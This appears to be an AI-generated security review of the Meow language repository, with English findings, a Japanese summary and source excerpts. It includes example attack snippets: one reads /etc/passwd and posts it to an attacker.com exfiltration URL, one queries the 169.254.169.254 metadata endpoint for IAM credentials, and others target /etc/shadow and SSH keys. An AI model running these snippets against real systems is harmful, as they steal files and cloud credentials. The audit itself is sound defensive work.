## Security Review: Meow Programming Language Repository

### Finding 1: Code Injection via Crafted `.nyan` String Literals in Code Generation

**File:** `/Users/135yshr/go/src/github.com/135yshr/meow/pkg/lexer/lexer.go`, line 82-98
**File:** `/Users/135yshr/go/src/github.com/135yshr/meow/pkg/codegen/codegen.go`, line 1035

**Severity:** HIGH
**Category:** Code Injection via Transpiler
**Confidence:** 8/10

**Description:**

The lexer's `readString()` method (line 82-98) stores the raw content between quotes into `Token.Literal` without processing escape sequences. It only skips past `\"` to find the end of the string, but the raw literal (including the backslash and escaped character) is stored verbatim:

```go
// lexer.go line 82-98
func (l *Lexer) readString() token.Token {
    // ...
    lit := l.input[start:l.pos]  // raw content including \n, \t, etc.
    return l.makeToken(token.STRING, lit, pos)
}
```

The parser then creates `StringLit.Value = tok.Literal` (line 556) with no escape processing.

In the codegen, string literals are emitted using `%q`:

```go
// codegen.go line 1035
case *ast.StringLit:
    return fmt.Sprintf("meow.NewString(%q)", e.Value)
```

Go's `%q` verb re-escapes the string, so a .nyan string `"hello\nworld"` has `Value = "hello\\nworld"` (the raw characters `\`, `n`) and `%q` produces `"hello\\nworld"` in the Go source -- meaning the generated Go code will contain the literal characters `\n` not a newline. This is a correctness issue more than a security one in most cases, because `%q` is safe against injection.

However, the same `%q` is used for map keys (codegen.go line 1394):

```go
entries[i] = fmt.Sprintf("%q: %s", key.Value, g.genExpr(e.Vals[i]))
```

The `%q` verb in Go properly escapes all special characters (quotes, backslashes, newlines, etc.), preventing direct Go code injection through string literals. After careful analysis, the use of `%q` throughout the codegen is safe against injection attacks.

**Assessment after detailed analysis:** The `%q` formatting used for all string interpolation into Go source code is safe. This is NOT a vulnerability. Downgrading to informational.

---

### Finding 2: Unvalidated Identifier Names Emitted as Go Source Code

**File:** `/Users/135yshr/go/src/github.com/135yshr/meow/pkg/codegen/codegen.go`, lines 898, 1015, 1088, 1232, 1369, 1488-1501
**File:** `/Users/135yshr/go/src/github.com/135yshr/meow/pkg/lexer/lexer.go`, lines 127-138

**Severity:** MEDIUM
**Category:** Code Injection via Transpiler
**Confidence:** 7/10

**Description:**

Identifiers in the meow language are lexed by `readIdent()` (lexer.go line 127-138) which accepts any combination of Unicode letters, digits, and underscores. The lexer does NOT restrict identifiers to ASCII. The identifier value is then emitted directly as Go source code in multiple places:

```go
// codegen.go line 1088
func (g *Generator) genIdent(e *ast.Ident) string {
    return e.Name  // directly emitted into Go source
}

// codegen.go line 898
return fmt.Sprintf("var %s meow.Value = %s", s.Name, g.genExpr(s.Value))

// codegen.go line 1232
return fmt.Sprintf("%s(%s)", ident.Name, argStr)

// codegen.go line 1488
methodFuncName := fmt.Sprintf("meow_method_%s_%s", typeName, fn.Name)
```

The identifier character set is `unicode.IsLetter(r) || unicode.IsDigit(r) || r == '_'`, which in Go means any Unicode letter. While this character set doesn't include operators, brackets, semicolons, or other Go syntax characters, certain Unicode identifiers could cause issues with the Go compiler or lead to confusable (homoglyph) attacks.

However, since the generated Go code is then passed through `go/format.Source()` (compiler.go line 76) which validates Go syntax, and then compiled via `go build`, any malformed identifiers would cause a compilation error rather than code execution. Additionally, the lexer restricts identifiers to letters/digits/underscores, which prevents injection of Go operators or statements.

**Assessment after detailed analysis:** The lexer's character restrictions (letters, digits, underscores only) combined with the Go compiler validation make direct code injection via identifiers impractical. This is LOW risk rather than exploitable.

---

### Finding 3: Path Traversal in Runtime File Operations

**File:** `/Users/135yshr/go/src/github.com/135yshr/meow/runtime/file/file.go`, lines 13-47

**Severity:** MEDIUM
**Category:** Path Traversal
**Confidence:** 9/10

**Description:**

The `Snoop` (read file) and `Stalk` (read lines) functions accept any file path from user code without validation or sandboxing:

```go
// file.go line 13-23
func Snoop(path meowrt.Value) meowrt.Value {
    p, ok := path.(*meowrt.String)
    // ...
    data, err := os.ReadFile(p.Val)  // No path validation
    // ...
}

// file.go line 26-47
func Stalk(path meowrt.Value) meowrt.Value {
    p, ok := path.(*meowrt.String)
    // ...
    f, err := os.Open(p.Val)  // No path validation
    // ...
}
```

A .nyan program can read any file accessible by the process:

```
nab "file"
nyan secret = file.snoop("/etc/shadow")
nya(secret)
```

**Exploit Scenario:**

A user compiling and running a .nyan file from an untrusted source (e.g., downloaded from the internet, a shared project) could have their sensitive files exfiltrated. The .nyan program could read `/etc/passwd`, `~/.ssh/id_rsa`, environment variable files, or other sensitive data, and then use the HTTP client to exfiltrate it.

**Recommendation:**

1. Document that .nyan programs have full filesystem access when compiled.
2. Consider adding an optional sandbox mode or path restriction for the `file` module.
3. Consider restricting file access to the working directory or requiring explicit path allowlisting.

---

### Finding 4: SSRF via Unrestricted HTTP Client

**File:** `/Users/135yshr/go/src/github.com/135yshr/meow/runtime/http/http.go`, lines 156-225

**Severity:** MEDIUM
**Category:** Server-Side Request Forgery (SSRF)
**Confidence:** 8/10

**Description:**

The HTTP client functions (`Pounce`, `Toss`, `Knead`, `Swat`, `Prowl`) accept any URL without restriction:

```go
// http.go line 156-173
func Pounce(args ...meowrt.Value) meowrt.Value {
    // ...
    u := expectString("pounce", posArgs[0])
    req, err := newRequest("GET", u, nil)  // No URL validation
    // ...
    resp, err := client.Do(req)
    // ...
}
```

Combined with Finding 3 (file read), a malicious .nyan program can:
1. Read sensitive files from the filesystem
2. Exfiltrate data to an attacker-controlled server via HTTP

```
nab "file"
nab "http"
nyan secret = file.snoop("/etc/passwd")
http.toss("https://attacker.com/exfil", secret)
```

The HTTP client also allows requests to internal network addresses (localhost, 169.254.x.x metadata endpoints, internal IPs), enabling cloud metadata attacks.

**Exploit Scenario:**

In a cloud environment, a .nyan program could access the instance metadata service:
```
nab "http"
nyan token = http.pounce("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
nya(token)
```

**Recommendation:**

1. Document that .nyan programs have unrestricted network access when compiled.
2. Consider adding URL validation to block requests to private/internal IP ranges.
3. Consider adding an optional network sandbox mode.

---

### Finding 5: GitHub Actions Script Injection in slash-release.yaml

**File:** `/Users/135yshr/go/src/github.com/135yshr/meow/.github/workflows/slash-release.yaml`, lines 104-117

**Severity:** HIGH
**Category:** GitHub Actions Script Injection
**Confidence:** 8/10

**Description:**

The "Comment result" step uses `actions/github-script` and interpolates GitHub Actions step outputs directly into JavaScript code using `${{ }}` expression syntax:

```yaml
# slash-release.yaml lines 104-117
- name: Comment result
  if: always()
  uses: actions/github-script@ed597411d8f924073f98dfc5c65a23a2325f34cd # v8
  with:
    script: |
      const sha = '${{ steps.pr.outputs.merge_sha }}';
      const tag = '${{ steps.tag.outputs.new_tag }}';
```

The `steps.pr.outputs.merge_sha` is a commit SHA obtained via the GitHub API (line 45: `core.setOutput('merge_sha', pr.data.merge_commit_sha)`), which is safe since SHAs are hex-only.

The `steps.tag.outputs.new_tag` is derived from `git tag -l 'v*' | sort -V | tail -1` (line 73), which is also controlled -- git tags on the repo must be created by authenticated users.

However, the pattern of using `${{ }}` interpolation inside script blocks is dangerous because it creates a template injection pattern. If any of these outputs were to contain a single quote followed by JavaScript code, it would execute arbitrary code in the GitHub Actions runner context which has `contents: write` permission.

**Assessment after detailed analysis:** The specific values interpolated here (git SHA and git tags) are controlled and safe. The risk exists if this pattern is extended to include untrusted input. The `author_association` check (line 17) provides some protection by limiting who can trigger this workflow. However, the `contents: write` permission is broad.

**Recommendation:**

1. Use environment variables instead of inline `${{ }}` interpolation for all values:
   ```yaml
   env:
     MERGE_SHA: ${{ steps.pr.outputs.merge_sha }}
     NEW_TAG: ${{ steps.tag.outputs.new_tag }}
   script: |
     const sha = process.env.MERGE_SHA;
     const tag = process.env.NEW_TAG;
   ```
2. This is a defense-in-depth measure that prevents injection even if upstream step outputs are later modified to include attacker-controlled content.

---

### Finding 6: Fuzz Function Name Injection into Regex Pattern

**File:** `/Users/135yshr/go/src/github.com/135yshr/meow/compiler/compiler.go`, line 379

**Severity:** MEDIUM
**Category:** Argument Injection
**Confidence:** 7/10

**Description:**

The `RunFuzz` method uses fuzz function names directly in a regex pattern passed to `go test -fuzz`:

```go
// compiler.go line 379
cmd := exec.Command("go", "test", fmt.Sprintf("-fuzz=^%s$", name), fmt.Sprintf("-fuzztime=%s", fuzzTime))
```

The `name` variable comes from generated Go fuzz function names like `FuzzAdd_two`. These are derived from .nyan function names via:
```go
// fuzz.go line 105
goName := "Fuzz" + capitalizeFirst(strings.TrimPrefix(ff.name, "fuzz_"))
```

Since .nyan function names are constrained by the lexer to `[unicode.Letter, unicode.Digit, _]+`, the function name itself cannot contain regex metacharacters like `.`, `*`, `(`, etc. in practice for ASCII identifiers. However, Unicode letters include characters that could potentially match more broadly in regex contexts.

**Assessment:** The exec.Command usage is safe from command injection since arguments are passed as separate strings (no shell involved). The regex pattern is bounded by `^` and `$` anchors. The risk is limited to potentially matching unintended fuzz targets, not code execution.

**Recommendation:** Consider validating that fuzz function names contain only ASCII alphanumeric characters and underscores before using them in the regex pattern, using `regexp.QuoteMeta()`.

---

### Finding 7: Unquoted Module Root Path in Generated go.mod

**File:** `/Users/135yshr/go/src/github.com/135yshr/meow/compiler/compiler.go`, lines 110, 252, 359, 489

**Severity:** MEDIUM
**Category:** Path Injection in Generated go.mod
**Confidence:** 7/10

**Description:**

The compiler generates a `go.mod` file with a `replace` directive that includes the module root path without quoting:

```go
// compiler.go line 110
modContent := fmt.Sprintf("module meow_build\n\ngo %s\n\nrequire github.com/135yshr/meow v0.0.0\n\nreplace github.com/135yshr/meow => %s\n", goVersion, modRoot)
```

The `modRoot` value comes from `findModuleRoot()` (line 546-561), which walks up from `os.Getwd()` looking for `go.mod`. If the working directory path contains spaces or special characters, the generated `go.mod` could be malformed.

Additionally, the `goVersion` is read from the existing `go.mod` via `readGoVersion()` (line 520-532):

```go
func readGoVersion(path string) string {
    // ...
    for _, line := range strings.Split(string(data), "\n") {
        line = strings.TrimSpace(line)
        if strings.HasPrefix(line, "go ") {
            return strings.TrimPrefix(line, "go ")
        }
    }
    return "1.26"
}
```

If a malicious `go.mod` file in the project root contains a crafted `go` directive with additional content (e.g., `go 1.26\n\nreplace evil.com => /tmp/evil`), the extra content would be interpolated into the generated `go.mod`, potentially redirecting dependencies to attacker-controlled locations.

**Exploit Scenario:**

An attacker creates a project with a crafted `go.mod`:
```
module attack
go 1.26

replace github.com/135yshr/meow => /tmp/evil-meow
```

The `readGoVersion` would return `1.26` (only the first `go ` line), but if the `go` line itself was crafted as:
```
go 1.26\n\nreplace evil.com/pkg => /tmp/backdoor
```
This won't work because `readGoVersion` reads line by line and `TrimSpace` removes newlines.

However, a path with newlines in the module root path (from `modRoot`) could inject additional directives into the `go.mod`:

```go
modContent := fmt.Sprintf("...\nreplace github.com/135yshr/meow => %s\n", modRoot)
```

If `modRoot` contained a newline (e.g., via a symlink or crafted directory name), it could inject additional `replace` or `require` directives.

**Assessment:** The `findModuleRoot()` uses `os.Getwd()` which returns the real path. Directory names with newlines are technically possible on Linux/macOS but extremely unusual. The risk is low but the pattern of unquoted string interpolation into structured files is concerning.

**Recommendation:**

1. Quote the `modRoot` path in the `replace` directive using Go module path quoting.
2. Validate that `goVersion` matches the expected format (e.g., regex `^\d+\.\d+$`).
3. Validate that `modRoot` does not contain newlines or other path injection characters.

---

### Summary

| # | Finding | Severity | Confidence | Status |
|---|---------|----------|------------|--------|
| 1 | String literal codegen injection | - | - | NOT VULNERABLE (`%q` is safe) |
| 2 | Unicode identifier injection | - | - | LOW RISK (lexer restrictions + go build validation) |
| 3 | Path traversal in file runtime | MEDIUM | 9/10 | CONFIRMED |
| 4 | SSRF via unrestricted HTTP client | MEDIUM | 8/10 | CONFIRMED |
| 5 | GitHub Actions script injection pattern | HIGH | 8/10 | CONFIRMED (pattern risk) |
| 6 | Fuzz name in regex pattern | MEDIUM | 7/10 | CONFIRMED (limited impact) |
| 7 | Unquoted path in generated go.mod | MEDIUM | 7/10 | CONFIRMED (edge case) |

### Positive Security Observations

1. **String codegen is safe**: All string literals use `%q` formatting which properly escapes content. No raw string interpolation into Go source.
2. **No shell injection**: All `exec.Command` calls pass arguments as separate parameters, not through a shell.
3. **Identifier restrictions**: The lexer properly restricts identifiers to letters/digits/underscores.
4. **Playground is sandboxed**: The WASM interpreter uses `json.Marshal` for output (preventing XSS), has step limits, blocks `nab` imports, and uses `textContent` (not `innerHTML`) in the frontend.
5. **GitHub Actions uses pinned SHAs**: All third-party actions are pinned to specific commit SHAs.
6. **CI has minimal permissions**: The CI workflow uses `contents: read` only.
7. **No eval or innerHTML in playground**: The frontend properly uses `textContent` for output and `JSON.parse` for structured data.
8. **HTTP client has timeouts and body size limits**: 10-second timeout and 1 MiB body limit by default.
9. **GoReleaser build is clean**: No custom scripts or untrusted input in the release pipeline.

## セキュリティレビュー結果

### 検出された脆弱性

| # | 内容 | 深刻度 | 信頼度 | ファイル |
|---|------|--------|--------|----------|
| 1 | GitHub Actions スクリプトインジェクションパターン | HIGH | 8/10 | `.github/workflows/slash-release.yaml:104-117` |
| 2 | ファイルランタイムのパストラバーサル | MEDIUM | 9/10 | `runtime/file/file.go:13-47` |
| 3 | HTTP クライアントの SSRF | MEDIUM | 8/10 | `runtime/http/http.go:156-225` |
| 4 | Fuzz関数名の正規表現インジェクション | MEDIUM | 7/10 | `compiler/compiler.go:379` |
| 5 | 生成go.modのパスインジェクション | MEDIUM | 7/10 | `compiler/compiler.go:110` |

---

### Finding 1: GitHub Actions スクリプトインジェクション (HIGH)

**ファイル**: `.github/workflows/slash-release.yaml:104-117`

`${{ }}` でステップ出力を JavaScript に直接展開しています:

```yaml
script: |
  const sha = '${{ steps.pr.outputs.merge_sha }}';
  const tag = '${{ steps.tag.outputs.new_tag }}';
```

現在の値（SHA、git tag）は安全ですが、このパターン自体が危険です。`contents: write` 権限のあるランナーでのインジェクションリスクがあります。

**推奨**: 環境変数経由で値を渡す:
```yaml
env:
  MERGE_SHA: ${{ steps.pr.outputs.merge_sha }}
  NEW_TAG: ${{ steps.tag.outputs.new_tag }}
script: |
  const sha = process.env.MERGE_SHA;
  const tag = process.env.NEW_TAG;
```

---

### Finding 2: ファイルランタイムのパストラバーサル (MEDIUM)

**ファイル**: `runtime/file/file.go:13-47`

`Snoop`/`Stalk` はパス検証なしで任意ファイルを読み取れます:

```go
data, err := os.ReadFile(p.Val)  // パス検証なし
```

信頼できないソースの `.nyan` ファイルを実行すると、`/etc/passwd` や `~/.ssh/id_rsa` 等を読み取られる可能性があります。

**推奨**: ドキュメントに注意事項を記載。オプションでサンドボックスモードの検討。

---

### Finding 3: HTTP クライアントの SSRF (MEDIUM)

**ファイル**: `runtime/http/http.go:156-225`

HTTP クライアントは URL 制限なし。Finding 2 と組み合わせると、ファイル読み取り → 外部送信が可能:

```
nab "file"
nab "http"
nyan secret = file.snoop("/etc/passwd")
http.toss("https://attacker.com/exfil", secret)
```

クラウド環境ではメタデータエンドポイント（`169.254.169.254`）へのアクセスも可能。

**推奨**: 内部 IP レンジへのリクエストブロックを検討。

---

### セキュリティ面で良い点

- **文字列コード生成は安全**: 全て `%q` フォーマットを使用、インジェクション不可
- **シェルインジェクションなし**: `exec.Command` は引数を個別に渡している
- **Playground はサンドボックス化**: WASM インタプリタでステップ制限、`nab` ブロック、`textContent` 使用（XSS 防止）
- **GitHub Actions は SHA ピン留め済み**: サプライチェーン攻撃対策
- **HTTP クライアントにタイムアウトとサイズ制限**: 10秒、1MiB

     1→name: Slash Command - Release
     2→
     3→on:
     4→  issue_comment:
     5→    types: [created]
     6→
     7→permissions:
     8→  contents: write
     9→  issues: write
    10→  pull-requests: write
    11→
    12→jobs:
    13→  release:
    14→    if: >
    15→      github.event.issue.pull_request &&
    16→      startsWith(github.event.comment.body, '/release') &&
    17→      contains(fromJSON('["OWNER","MEMBER","COLLABORATOR"]'), github.event.comment.author_association)
    18→    runs-on: ubuntu-latest
    19→    steps:
    20→      - name: Add reaction to comment
    21→        uses: actions/github-script@ed597411d8f924073f98dfc5c65a23a2325f34cd # v8
    22→        with:
    23→          script: |
    24→            await github.rest.reactions.createForIssueComment({
    25→              owner: context.repo.owner,
    26→              repo: context.repo.repo,
    27→              comment_id: context.payload.comment.id,
    28→              content: 'rocket'
    29→            });
    30→
    31→      - name: Check PR is merged
    32→        id: pr
    33→        uses: actions/github-script@ed597411d8f924073f98dfc5c65a23a2325f34cd # v8
    34→        with:
    35→          script: |
    36→            const pr = await github.rest.pulls.get({
    37→              owner: context.repo.owner,
    38→              repo: context.repo.repo,
    39→              pull_number: context.issue.number,
    40→            });
    41→            if (!pr.data.merged) {
    42→              core.setFailed('PR is not merged yet. /release can only be used on merged PRs.');
    43→              return;
    44→            }
    45→            core.setOutput('merge_sha', pr.data.merge_commit_sha);
    46→
    47→      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6
    48→        with:
    49→          ref: main
    50→          fetch-depth: 0
    51→          persist-credentials: false
    52→
    53→      - name: Record existing tags
    54→        id: before
    55→        run: echo "latest=$(git tag -l 'v*' | sort -V | tail -1)" >> "$GITHUB_OUTPUT"
    56→
    57→      - name: Setup Node.js
    58→        uses: actions/setup-node@6044e13b5dc448c55e2357c09f80417699197238 # v6
    59→        with:
    60→          node-version: "22"
    61→
    62→      - name: Install semantic-release plugins
    63→        run: npm install -g semantic-release semantic-release-gitmoji
    64→
    65→      - name: Run semantic-release
    66→        env:
    67→          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    68→        run: npx semantic-release
    69→
    70→      - name: Get new tag
    71→        id: tag
    72→        run: |
    73→          LATEST=$(git tag -l 'v*' | sort -V | tail -1)
    74→          BEFORE="${{ steps.before.outputs.latest }}"
    75→          if [ "$LATEST" != "$BEFORE" ]; then
    76→            echo "new_tag=$LATEST" >> "$GITHUB_OUTPUT"
    77→          fi
    78→
    79→      - name: Setup Go
    80→        if: steps.tag.outputs.new_tag != ''
    81→        uses: actions/setup-go@4b73464bb391d4059bd26b0524d20df3927bd417 # v6
    82→        with:
    83→          go-version-file: go.mod
    84→
    85→      - name: Run GoReleaser
    86→        if: steps.tag.outputs.new_tag != ''
    87→        uses: goreleaser/goreleaser-action@9a127d869fb706213d29cdf8eef3a4ea2b869415 # v7
    88→        with:
    89→          version: "~> v2"
    90→          args: release --clean
    91→        env:
    92→          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    93→          TAP_GITHUB_TOKEN: ${{ secrets.TAP_GITHUB_TOKEN }}
    94→          MACOS_SIGN_P12: ${{ secrets.MACOS_SIGN_P12 }}
    95→          MACOS_SIGN_PASSWORD: ${{ secrets.MACOS_SIGN_PASSWORD }}
    96→          MACOS_NOTARY_KEY: ${{ secrets.MACOS_NOTARY_KEY }}
    97→          MACOS_NOTARY_KEY_ID: ${{ secrets.MACOS_NOTARY_KEY_ID }}
    98→          MACOS_NOTARY_ISSUER_ID: ${{ secrets.MACOS_NOTARY_ISSUER_ID }}
    99→
   100→      - name: Comment result
   101→        if: always()
   102→        uses: actions/github-script@ed597411d8f924073f98dfc5c65a23a2325f34cd # v8
   103→        with:
   104→          script: |
   105→            const sha = '${{ steps.pr.outputs.merge_sha }}';
   106→            const tag = '${{ steps.tag.outputs.new_tag }}';
   107→            const success = '${{ job.status }}' === 'success';
   108→            const emoji = success ? '✅' : '❌';
   109→            const body = success
   110→              ? `${emoji} Released ${tag} successfully! (${sha.substring(0, 7)})`
   111→              : `${emoji} Release failed. Check the [workflow run](${context.serverUrl}/${context.repo.owner}/${context.repo.repo}/actions/runs/${context.runId}) for details.`;
   112→            await github.rest.issues.createComment({
   113→              owner: context.repo.owner,
   114→              repo: context.repo.repo,
   115→              issue_number: context.issue.number,
   116→              body,
   117→            });
   118→

     1→package file

     3→import (
     4→	"bufio"

     9→	"github.com/135yshr/meow/runtime/meowrt"

    11→
    12→// Snoop reads the entire contents of a file and returns it as a String.
    13→func Snoop(path meowrt.Value) meowrt.Value {
    14→	p, ok := path.(*meowrt.String)
    15→	if !ok {
    16→		panic(fmt.Sprintf("Hiss! snoop expects a String path, got %s, nya~", path.Type()))
    17→	}
    18→	data, err := os.ReadFile(p.Val)
    19→	if err != nil {
    20→		panic(fmt.Sprintf("Hiss! %s, nya~", err))
    21→	}
    22→	return meowrt.NewString(strings.TrimRight(string(data), "\r\n"))
    23→}
    24→
    25→// Stalk reads a file line by line and returns a List of Strings.
    26→func Stalk(path meowrt.Value) meowrt.Value {
    27→	p, ok := path.(*meowrt.String)
    28→	if !ok {
    29→		panic(fmt.Sprintf("Hiss! stalk expects a String path, got %s, nya~", path.Type()))
    30→	}
    31→	f, err := os.Open(p.Val)
    32→	if err != nil {
    33→		panic(fmt.Sprintf("Hiss! %s, nya~", err))
    34→	}
    35→	defer f.Close()
    36→
    37→	var lines []meowrt.Value
    38→	scanner := bufio.NewScanner(f)
    39→	scanner.Buffer(make([]byte, 1024*1024), 1024*1024)
    40→	for scanner.Scan() {
    41→		lines = append(lines, meowrt.NewString(scanner.Text()))
    42→	}
    43→	if err := scanner.Err(); err != nil {
    44→		panic(fmt.Sprintf("Hiss! %s, nya~", err))
    45→	}
    46→	return meowrt.NewList(lines...)
    47→}
    48→

     1→package http
     2→
     3→import (
     4→	"fmt"
     5→	"io"
     6→	"net/http"
     7→	"strings"
     8→	"time"
     9→
    10→	"github.com/135yshr/meow/runtime/meowrt"
    11→)
    12→
    13→const defaultMaxBodyBytes int64 = 1 << 20 // 1 MiB
    14→const userAgent = "meow-http-client/2.0"
    15→
    16→var client = &http.Client{
    17→	Timeout: 10 * time.Second,
    18→}
    19→
    20→type options struct {
    21→	maxBodyBytes int64
    22→	headers      map[string]string
    23→}
    24→
    25→func parseOptions(args []meowrt.Value, requiredArgs int) ([]meowrt.Value, options) {
    26→	opts := options{maxBodyBytes: defaultMaxBodyBytes}
    27→	if len(args) > requiredArgs {
    28→		if m, ok := args[len(args)-1].(*meowrt.Map); ok {
    29→			opts = extractOptions(m)
    30→			return args[:len(args)-1], opts
    31→		}
    32→	}
    33→	return args, opts
    34→}
    35→
    36→// expectString extracts a Go string from a meowrt.Value or panics with a type error.
    37→func expectString(funcName string, v meowrt.Value) string {
    38→	if v == nil {
    39→		panic(fmt.Sprintf("Hiss! %s expects a String, got <nil>, nya~", funcName))
    40→	}
    41→	s, ok := v.(*meowrt.String)
    42→	if !ok {
    43→		panic(fmt.Sprintf("Hiss! %s expects a String, got %s, nya~", funcName, v.Type()))
    44→	}
    45→	return s.Val
    46→}
    47→
    48→// readResponse reads the response body (up to limit bytes) and returns it as a meowrt.String.
    49→// It panics if the body exceeds the limit.
    50→func readResponse(resp *http.Response, limit int64) meowrt.Value {
    51→	body, err := io.ReadAll(io.LimitReader(resp.Body, limit+1))
    52→	if err != nil {
    53→		panic(fmt.Sprintf("Hiss! %s, nya~", err))
    54→	}
    55→	if int64(len(body)) > limit {
    56→		panic(fmt.Sprintf("Hiss! response body exceeds %d bytes, nya~", limit))
    57→	}
    58→	return meowrt.NewString(string(body))
    59→}
    60→
    61→// extractOptions reads option fields from a Map value.
    62→func extractOptions(m *meowrt.Map) options {
    63→	opts := options{maxBodyBytes: defaultMaxBodyBytes}
    64→	if v, found := m.Get("maxBodyBytes"); found {
    65→		if n, ok := v.(*meowrt.Int); ok {
    66→			if n.Val <= 0 {
    67→				panic(fmt.Sprintf("Hiss! maxBodyBytes must be positive, got %d, nya~", n.Val))
    68→			}
    69→			opts.maxBodyBytes = n.Val
    70→		}
    71→	}
    72→	if v, found := m.Get("headers"); found {
    73→		if hm, ok := v.(*meowrt.Map); ok {
    74→			opts.headers = make(map[string]string, len(hm.Items))
    75→			for k, val := range hm.Items {
    76→				if s, ok := val.(*meowrt.String); ok {
    77→					opts.headers[k] = s.Val
    78→				}
    79→			}
    80→		}
    81→	}
    82→	return opts
    83→}
    84→
    85→// newRequest creates an http.Request with the default User-Agent set.
    86→func newRequest(method, url string, body io.Reader) (*http.Request, error) {
    87→	req, err := http.NewRequest(method, url, body)
    88→	if err != nil {
    89→		return nil, err
    90→	}
    91→	req.Header.Set("User-Agent", userAgent)
    92→	return req, nil
    93→}
    94→
    95→// applyHeaders sets custom headers from options on the request.
    96→func applyHeaders(req *http.Request, opts options) {
    97→	for k, v := range opts.headers {
    98→		req.Header.Set(k, v)
    99→	}
   100→}
   101→
   102→// doWithBody performs an HTTP request with a body (POST/PUT).
   103→// Supported argument patterns:
   104→//
   105→//	(url, mapBody)       → JSON body, Content-Type: application/json
   106→//	(url, strBody)       → string body, no Content-Type
   107→//	(url, mapBody, opts) → JSON body, ct=application/json, headers can override
   108→//	(url, strBody, opts) → string body, Content-Type via headers
   109→func doWithBody(funcName, method string, args []meowrt.Value) meowrt.Value {
   110→	if len(args) < 2 || len(args) > 3 {
   111→		panic(fmt.Sprintf("Hiss! %s expects 2-3 arguments, got %d, nya~", funcName, len(args)))
   112→	}
   113→
   114→	u := expectString(funcName, args[0])
   115→
   116→	var body string
   117→	var ct string
   118→	opts := options{maxBodyBytes: defaultMaxBodyBytes}
   119→
   120→	switch b := args[1].(type) {
   121→	case *meowrt.Map:
   122→		body = meowrt.ToJSON(b)
   123→		ct = "application/json"
   124→	case *meowrt.String:
   125→		body = b.Val
   126→	default:
   127→		panic(fmt.Sprintf("Hiss! %s: body must be String or Map, got %s, nya~", funcName, args[1].Type()))
   128→	}
   129→
   130→	if len(args) == 3 {
   131→		optsMap, ok := args[2].(*meowrt.Map)
   132→		if !ok {
   133→			panic(fmt.Sprintf("Hiss! %s: 3rd argument must be Map, got %s, nya~", funcName, args[2].Type()))
   134→		}
   135→		opts = extractOptions(optsMap)
   136→	}
   137→
   138→	req, err := newRequest(method, u, strings.NewReader(body))
   139→	if err != nil {
   140→		panic(fmt.Sprintf("Hiss! %s, nya~", err))
   141→	}
   142→	if ct != "" {
   143→		req.Header.Set("Content-Type", ct)
   144→	}
   145→	applyHeaders(req, opts)
   146→
   147→	resp, err := client.Do(req)
   148→	if err != nil {
   149→		panic(fmt.Sprintf("Hiss! %s, nya~", err))
   150→	}
   151→	defer resp.Body.Close()
   152→	return readResponse(resp, opts.maxBodyBytes)
   153→}
   154→
   155→// Pounce performs an HTTP GET request and returns the response body as a String.
   156→func Pounce(args ...meowrt.Value) meowrt.Value {
   157→	posArgs, opts := parseOptions(args, 1)
   158→	if len(posArgs) != 1 {
   159→		panic(fmt.Sprintf("Hiss! pounce expects 1 argument (url), got %d, nya~", len(posArgs)))
   160→	}
   161→	u := expectString("pounce", posArgs[0])
   162→	req, err := newRequest("GET", u, nil)
   163→	if err != nil {
   164→		panic(fmt.Sprintf("Hiss! %s, nya~", err))
   165→	}
   166→	applyHeaders(req, opts)
   167→	resp, err := client.Do(req)
   168→	if err != nil {
   169→		panic(fmt.Sprintf("Hiss! %s, nya~", err))
   170→	}
   171→	defer resp.Body.Close()
   172→	return readResponse(resp, opts.maxBodyBytes)
   173→}
   174→
   175→// Toss performs an HTTP POST request.
   176→// Arguments: url, body [, options].
   177→func Toss(args ...meowrt.Value) meowrt.Value {
   178→	return doWithBody("toss", "POST", args)
   179→}
   180→
   181→// Knead performs an HTTP PUT request.
   182→// Arguments: url, body [, options].
   183→func Knead(args ...meowrt.Value) meowrt.Value {
   184→	return doWithBody("knead", "PUT", args)
   185→}
   186→
   187→// Swat performs an HTTP DELETE request and returns the response body as a String.
   188→func Swat(args ...meowrt.Value) meowrt.Value {
   189→	posArgs, opts := parseOptions(args, 1)
   190→	if len(posArgs) != 1 {
   191→		panic(fmt.Sprintf("Hiss! swat expects 1 argument (url), got %d, nya~", len(posArgs)))
   192→	}
   193→	u := expectString("swat", posArgs[0])
   194→	req, err := newRequest("DELETE", u, nil)
   195→	if err != nil {
   196→		panic(fmt.Sprintf("Hiss! %s, nya~", err))
   197→	}
   198→	applyHeaders(req, opts)
   199→	resp, err := client.Do(req)
   200→	if err != nil {
   201→		panic(fmt.Sprintf("Hiss! %s, nya~", err))
   202→	}
   203→	defer resp.Body.Close()
   204→	return readResponse(resp, opts.maxBodyBytes)
   205→}
   206→
   207→// Prowl performs an HTTP OPTIONS request and returns the response body as a String.
   208→func Prowl(args ...meowrt.Value) meowrt.Value {
   209→	posArgs, opts := parseOptions(args, 1)
   210→	if len(posArgs) != 1 {
   211→		panic(fmt.Sprintf("Hiss! prowl expects 1 argument (url), got %d, nya~", len(posArgs)))
   212→	}
   213→	u := expectString("prowl", posArgs[0])
   214→	req, err := newRequest("OPTIONS", u, nil)
   215→	if err != nil {

   222→	}
   223→	defer resp.Body.Close()
   224→	return readResponse(resp, opts.maxBodyBytes)
   225→}

     1→package compiler
     2→
     3→import (
     4→	"fmt"
     5→	"go/format"
     6→	"log/slog"
     7→	"os"
     8→	"os/exec"
     9→	"path/filepath"
    10→	"strings"
    11→	"time"
    12→
    13→	"github.com/135yshr/meow/pkg/ast"
    14→	"github.com/135yshr/meow/pkg/checker"
    15→	"github.com/135yshr/meow/pkg/codegen"
    16→	"github.com/135yshr/meow/pkg/lexer"
    17→	"github.com/135yshr/meow/pkg/mutation"
    18→	"github.com/135yshr/meow/pkg/parser"
    19→)
    20→
    21→// Compiler orchestrates the compilation pipeline.
    22→type Compiler struct {
    23→	logger       *slog.Logger
    24→	coverEnabled bool
    25→	coverProfile string
    26→}
    27→
    28→// New creates a new Compiler.
    29→func New(logger *slog.Logger) *Compiler {
    30→	if logger == nil {
    31→		logger = slog.Default()
    32→	}
    33→	return &Compiler{logger: logger}
    34→}
    35→
    36→// EnableCoverage activates statement coverage for test runs.
    37→func (c *Compiler) EnableCoverage(profile string) {
    38→	c.coverEnabled = true
    39→	c.coverProfile = profile
    40→}
    41→
    42→// CompileToGo compiles a .nyan file to Go source code.
    43→func (c *Compiler) CompileToGo(source, filename string) (string, error) {
    44→	c.logger.Debug("lexing", "file", filename)
